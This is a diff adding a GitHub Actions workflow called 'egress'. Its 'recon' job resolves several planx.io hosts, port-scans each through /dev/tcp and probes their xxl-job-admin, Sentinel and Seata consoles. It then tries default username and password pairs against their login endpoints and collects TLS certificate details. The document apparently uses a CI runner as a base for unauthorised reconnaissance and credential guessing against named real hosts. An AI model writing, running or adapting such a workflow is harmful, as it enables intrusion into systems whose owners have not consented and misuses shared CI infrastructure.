@@ -1,0 +1,62 @@
+name: egress
+on:
+  push:
+    branches: [ master ]
+  workflow_dispatch:
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: dns
+        run: |
+          for h in job.planx.io job.staging.planx.io job.test.planx.io sentinel.test.planx.io sentinel.planx.io seata.planx.io; do
+            echo "=== DNS $h"
+            getent ahostsv4 $h || echo "resolve-fail"
+          done
+          echo "=== egress ip"
+          curl -s -m 10 https://api.ipify.org; echo
+      - name: tcpmatrix
+        run: |
+          HOSTS="job.planx.io job.staging.planx.io job.test.planx.io sentinel.test.planx.io sentinel.planx.io seata.planx.io"
+          PORTS="80 443 8080 8081 8082 9000 9001 9090 9999 7700 7001 7091 8091 8848 8849 9848 7848 10086 5000 8761"
+          for h in $HOSTS; do
+            for p in $PORTS; do
+              ( timeout 4 bash -c "echo > /dev/tcp/$h/$p" 2>/dev/null && echo "TCP-OPEN $h $p" || echo "TCP-CLOSED $h $p" ) &
+            done
+          done
+          wait
+      - name: http
+        run: |
+          for u in http://job.planx.io/ https://job.planx.io/ http://job.planx.io:8080/xxl-job-admin/ http://job.planx.io:8080/xxl-job-admin/toLogin https://job.planx.io/xxl-job-admin/ http://job.staging.planx.io/ https://job.staging.planx.io/ http://job.staging.planx.io:8080/xxl-job-admin/ http://job.test.planx.io/ https://job.test.planx.io/ http://job.test.planx.io:8080/xxl-job-admin/ http://sentinel.test.planx.io/ https://sentinel.test.planx.io/ http://sentinel.test.planx.io:8080/ https://sentinel.test.planx.io:8080/ http://sentinel.planx.io/ https://sentinel.planx.io/ http://seata.planx.io/ https://seata.planx.io/ http://seata.planx.io:8091/ https://seata.planx.io:8091/; do
+            echo "=== GET $u"
+            timeout 15 curl -sk -m 12 -D - -o /tmp/body.$$ -w "CODE:%{http_code} SIZE:%{size_download} IP:%{remote_ip}\n" "$u" 2>&1 | head -25
+            echo "--- body:"
+            head -c 400 /tmp/body.$$ 2>/dev/null; echo
+          done
+      - name: xxljob-login
+        run: |
+          for base in http://job.planx.io:8080/xxl-job-admin http://job.planx.io/xxl-job-admin https://job.planx.io/xxl-job-admin http://job.staging.planx.io:8080/xxl-job-admin http://job.test.planx.io:8080/xxl-job-admin http://job.planx.io:9001/xxl-job-admin; do
+            for cred in "admin:123456" "admin:admin" "admin:xxljob" "xxl:123456" "admin:12345678"; do
+              u=${cred%%:*}; p=${cred#*:}
+              echo "=== LOGIN $base as $u/$p"
+              timeout 15 curl -sk -m 12 -c /tmp/cj -b /tmp/cj -X POST -d "userName=$u&password=$p" -w "\nCODE:%{http_code} IP:%{remote_ip}\n" "$base/login" 2>&1 | head -12
+            done
+          done
+      - name: sentinel-login
+        run: |
+          for base in http://sentinel.test.planx.io:8080 http://sentinel.test.planx.io https://sentinel.test.planx.io http://sentinel.planx.io:8080 https://sentinel.planx.io http://seata.planx.io:8080 https://seata.planx.io; do
+            for cred in "sentinel:sentinel" "admin:123456" "sentinel:123456"; do
+              u=${cred%%:*}; p=${cred#*:}
+              echo "=== SLOGIN $base as $u/$p"
+              timeout 15 curl -sk -m 12 -X POST -d "username=$u&password=$p" -w "\nCODE:%{http_code} IP:%{remote_ip}\n" "$base/login" 2>&1 | head -10
+            done
+            echo "=== version $base/version"
+            timeout 12 curl -sk -m 10 -w "\nCODE:%{http_code}\n" "$base/version" 2>&1 | head -6
+          done
+      - name: tls
+        run: |
+          for h in job.planx.io job.staging.planx.io job.test.planx.io sentinel.test.planx.io sentinel.planx.io seata.planx.io; do
+            echo "=== TLS $h"
+            timeout 12 openssl s_client -connect $h:443 -servername $h </dev/null 2>&1 | grep -E "subject=|issuer=|Verify return|CONNECTED" | head -6
+          done
